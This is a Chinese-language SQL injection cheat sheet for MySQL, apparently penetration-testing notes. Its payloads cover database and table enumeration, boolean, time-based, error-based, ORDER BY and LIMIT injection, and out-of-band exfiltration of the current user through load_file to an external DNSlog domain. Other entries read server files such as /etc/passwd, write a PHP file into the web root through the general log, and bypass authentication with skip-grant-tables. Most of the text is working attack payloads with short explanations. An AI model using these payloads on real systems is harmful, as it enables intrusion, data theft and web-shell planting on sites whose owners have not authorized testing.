获取所有数据库

SELECT group_concat(schema_name) FROM information_schema.schemata

获取当前用户

select user()
# 有时候数据库用户这样写：xxxx@localhost，有时候这样写:xxxx@%，有啥区别。当是“%”的时候，说明任意地址都能对数据库操作，于是我们在外部就能连接别人的数据库

获取表名

select group_concat(table_name) from information_schema.tables where table_schema=database()

获取列名

select group_concat(column_name) from information_schema.columns where table_name='abc'

布尔盲注

select * from users where username=nouser or length(database())>8

select * from users where username=nouser or ascii(substr(database(),1,1))<130

时间盲注

# sleep()
select * from users where username=$username and if(length(database())>8,sleep(3),1)

select * from users where username=$username and if(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null))

报错注入拼接字符时返回正常页面的问题

问题：有时使用xpath报错拼接字符串时会返回正常页面
原因：
从原理出发，可能是使用concat拼接时有数据为null，导致整个拼接字符为null,这又符合xpath_string语法，所以页面正常，只是xpath没匹配到结果
解决：
使用concat_ws替代，忽略所有null值
语法实例：concat_ws(';',user,pass,tel)

dnslog外带注入（windows下）

# @@secure_file_priv 变量不为null
select load_file(concat('\\\\',(select user()),'.xxxx.ceye.io\xxxx'))

# 为什么Windows可用，Linux不行？
# 这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以`\\`开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个`\\\\`中的两个`\`是用来进行转义处理的。

order by注入

判断注入类型-rand

#数字型order by注入时,语句order by=2 and 1=2,和order by=2 and 1=1 显示的结果一样,所以无法用来判断注入点类型，而rand()在数字型中，每次刷新会显示不同的排序结果，当在字符型中用?sort=rand(),则不会有效果,排序不会改变，因此用rand()可判断注入点类型
select * from users order by rand()

结合if盲注

# 数字型
?order=if(表达式,2,3)

# 知道列名
?order=if(表达式,id,username)

# 不知道列名，表达式为false时，sql语句会报ERROR 1242 (21000): Subquery returns more than 1 row的错误，导致查询内容为空
order=if(表达式,1,(select id from information_schema.tables))

结合时间盲注

order by if(表达式,1,sleep(1))

结合报错

order by updatexml(1,if(1=2,1,(表达式)),1)

limit注入

# 有报错信息
select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);

# 布尔盲注，参考 LIMIT子句中的盲 SQL注入漏洞利用 https://xz.aliyun.com/t/5858
select * from tbl_albums where page=2 order by album_date asc LIMIT 0,ascii(substr((Select version()),1,1))

# 无回显，结合时间盲注，参考：https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html
select id from users order by id limit 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(if(mid(version(),1,1) like 5, BENCHMARK(5000000,SHA1(1)),1))))),1)

字符串截取函数

# left(a,b)从左侧截取a的前b位
left(database(),1)>'s'

# substr(a,b,c)从b位置开始，截取字符串a的c长度。ascii()将某个字符转换为ascii值
ascii(substr((select database()),1,1))=98

# mid(a,b,c)从位置b开始，截取a字符串的c位，ord()函数同ascii()，将字符转为ascii值
ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))>98

# regexp正则注入，user()结果为root，regexp为匹配root的正则表达式
# 参考链接：https://www.cnblogs.com/lcamry/articles/5717442.html
select user() regexp '^[a-z]';
select user() regexp '^ro'

文件读取

# 查询权限
select @@secure_file_priv;
select @@global.secure_file_priv;

# 读文件，前两种需要`secure-file-priv`无值或为有利目录。都需要知道要读取的文件所在的绝对路径。要读取的文件大小必须小于`max_allowed_packet`所设置的值。
select load_file(file_path);

load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取服务端文件

load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取客户端文件

# 低权限读文件，mysql 5.5.53 secure-file-priv=NULL 读文件payload，mysql8测试失败，mysql 5.7 可行，其他版本自测
drop table mysql.m1;
CREATE TABLE mysql.m1 (code TEXT );
LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '\n';
select * from mysql.m1;

# @@secure_file_priv的值不为NULL
select 1,2,3 into outfile 'd:\1.txt'
select 1,2,3 into dumpfile 'd:\1.txt'

日志写文件

  • 权限够，可以进行日志的设置操作
  • 知道目标目录的绝对路径
# 请求日志
set global general_log_file = '/var/www/html/1.php';
set global general_log = on;
select '<?php phpinfo();?>';

set global slow_query_log_file='/var/www/html/2.php'
set global slow_query_log=1;
select '<?php phpinfo();?>';

取消密码校验

参考：https://blog.csdn.net/qq_40732354/article/details/99633971

步骤：
1.修改mysql配置文件，linux默认/etc/my.cnf
2.在文件中的 [mysqld] 下添加 skip-grant-tables = 1
3.重启mysql服务 systemctl restart mysqld
4.连接mysql，密码已置为空
